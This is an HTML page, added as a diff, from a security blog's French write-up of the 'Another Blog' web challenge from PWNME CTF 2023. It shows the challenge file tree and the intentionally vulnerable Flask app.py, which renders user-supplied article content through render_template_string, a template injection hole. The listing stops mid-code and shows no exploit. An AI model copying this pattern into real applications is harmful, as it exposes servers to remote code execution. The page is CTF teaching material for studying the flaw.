@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Another Blog | PWNME CTF 2023</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Another&#32;Blog&#32;|&#32;PWNME&#32;CTF&#32;2023 />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Another&#32;Blog&#32;|&#32;PWNME&#32;CTF&#32;2023 />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Another&#32;Blog&#32;|&#32;PWNME&#32;CTF&#32;2023 />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Another&#32;Blog&#32;|&#32;PWNME&#32;CTF&#32;2023 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Voici un writeup complet du quatrième challenge web du pwnme ctf" />
+<meta itemprop="description" content="Voici un writeup complet du quatrième challenge web du pwnme ctf" />
+<meta property="og:description" content="Voici un writeup complet du quatrième challenge web du pwnme ctf" />
+<meta name="twitter:description" content="Voici un writeup complet du quatrième challenge web du pwnme ctf" />
+
+
+<base href="//localhost:1313/writeups/another_blog-pwnme-2023/" />
+<link rel="canonical" href="//localhost:1313/writeups/another_blog-pwnme-2023/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/another_blog-pwnme-2023/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/another_blog-pwnme-2023/" />
+<meta property="og:url" content="//localhost:1313/writeups/another_blog-pwnme-2023/" />
+
+
+<meta property="og:updated_time" content="2023-05-06T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/another_blog-pwnme-2023/">Another Blog | PWNME CTF 2023</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2023-05-06T12:00:00Z" class="post-date">
+        May 6, 2023
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>7 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-flask">
+        <a href="//localhost:1313/tags/flask">flask</a>
+      </li>
+      
+      <li class="tag-injection">
+        <a href="//localhost:1313/tags/injection">injection</a>
+      </li>
+      
+      <li class="tag-ssti">
+        <a href="//localhost:1313/tags/ssti">ssti</a>
+      </li>
+      
+      <li class="tag-python">
+        <a href="//localhost:1313/tags/python">python</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h1 id="introduction-du-challenge">Introduction du challenge:</h1>
+<pre tabindex="0"><code>Objective: Read the flag, situated on the server in /app/flag.txt
+</code></pre><h1 id="tree-viewer">Tree Viewer</h1>
+<p>Les sources de ce challenge sont fournies :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── app.py
+</span></span><span style="display:flex;"><span>├── articles.py
+</span></span><span style="display:flex;"><span>├── config.yaml
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── flag.txt
+</span></span><span style="display:flex;"><span>├── input.css
+</span></span><span style="display:flex;"><span>├── package.json
+</span></span><span style="display:flex;"><span>├── package-lock.json
+</span></span><span style="display:flex;"><span>├── requirements.txt
+</span></span><span style="display:flex;"><span>├── static
+</span></span><span style="display:flex;"><span>│   └── style.css
+</span></span><span style="display:flex;"><span>├── tailwind.config.js
+</span></span><span style="display:flex;"><span>├── templates
+</span></span><span style="display:flex;"><span>│   ├── article.html
+</span></span><span style="display:flex;"><span>│   ├── articles.html
+</span></span><span style="display:flex;"><span>│   ├── banner.html
+</span></span><span style="display:flex;"><span>│   ├── head.html
+</span></span><span style="display:flex;"><span>│   ├── home.html
+</span></span><span style="display:flex;"><span>│   ├── login.html
+</span></span><span style="display:flex;"><span>│   └── register.html
+</span></span><span style="display:flex;"><span>└── users.py
+</span></span></code></pre></div><p>On a ici 3 fichiers intéressants :</p>
+<ul>
+<li><em>users.py</em></li>
+<li><em>articles.py</em></li>
+<li><em>app.py</em></li>
+</ul>
+<p>L&rsquo;application est un serveur flask:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> template
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, render_template_string, request, redirect, session, sessions
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> users <span style="color:#f92672">import</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> articles <span style="color:#f92672">import</span> Articles
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> Users()
+</span></span><span style="display:flex;"><span>articles  <span style="color:#f92672">=</span> Articles()
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__, template_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;templates&#39;</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(:secret:)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.context_processor</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">inject_user</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> dict(session<span style="color:#f92672">=</span>session)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/create&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_article</span>():
+</span></span><span style="display:flex;"><span>    name, content <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>), request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;content&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> type(name) <span style="color:#f92672">!=</span> str <span style="color:#f92672">or</span> type(content) <span style="color:#f92672">!=</span> str <span style="color:#f92672">or</span> len(name) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/articles&#39;</span>)
+</span></span><span style="display:flex;"><span>    articles<span style="color:#f92672">.</span>set(name, content)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/articles&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/remove/&lt;name&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_article</span>(name):
+</span></span><span style="display:flex;"><span>    articles<span style="color:#f92672">.</span>remove(name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/articles&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/articles/&lt;name&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_page</span>(name):
+</span></span><span style="display:flex;"><span>    article_content <span style="color:#f92672">=</span> articles[name]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> article_content <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">in</span> session <span style="color:#f92672">and</span> users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>        article_content <span style="color:#f92672">=</span> render_template_string(article_content)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;article.html&#39;</span>, article<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;name&#39;</span>:name, <span style="color:#e6db74">&#39;content&#39;</span>:article_content})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/articles&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_all_articles</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;articles.html&#39;</span>, articles<span style="color:#f92672">=</span>articles<span style="color:#f92672">.</span>get_all())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/show_template&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_template</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">in</span> session <span style="color:#f92672">and</span> users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;restricted&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;value&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+</span></span><span style="display:flex;"><span>            users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            users[session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;username&#39;</span>]][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;user&#39;</span>][<span style="color:#e6db74">&#39;seeTemplate&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/articles&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
